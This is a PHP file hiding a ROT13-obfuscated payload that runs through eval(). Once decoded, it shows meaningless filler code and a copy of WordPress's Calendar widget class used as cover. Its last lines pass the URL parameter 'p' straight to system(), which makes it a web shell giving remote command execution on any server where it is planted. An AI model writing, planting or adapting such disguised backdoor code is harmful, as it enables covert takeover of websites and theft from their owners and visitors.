<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Pnyraqne pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gur Pnyraqne jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Pnyraqne rkgraqf JC_Jvqtrg {
	/**
	 * Rafher gung gur VQ nggevohgr bayl nccrnef va gur znexhc bapr
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	cevingr fgngvp $vafgnapr = 0;

	/**
	 * Frgf hc n arj Pnyraqne jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'pynffanzr'                   => 'jvqtrg_pnyraqne',
			'qrfpevcgvba'                 => __( 'N pnyraqne bs lbhe fvgr’f cbfgf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'pnyraqne', __( 'Pnyraqne' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Pnyraqne jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Gur frggvatf sbe gur cnegvphyne vafgnapr bs gur jvqtrg.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$gvgyr = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : '';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		rpub $netf['orsber_jvqtrg'];
		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}
		vs ( 0 === frys::$vafgnapr ) {
			rpub '<qvi vq=\"pnyraqne_jenc\" pynff=\"pnyraqne_jenc\">';
		} ryfr {
			rpub '<qvi pynff=\"pnyraqne_jenc\">';
		}
		trg_pnyraqne();
		rpub '</qvi>';
		rpub $netf['nsgre_jvqtrg'];

		++frys::$vafgnapr;
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Pnyraqne jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr          = $byq_vafgnapr;
		$vafgnapr['gvgyr'] = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );

		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Pnyraqne jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf( (neenl) $vafgnapr, neenl( 'gvgyr' => '' ) );
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\" />
		</c>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>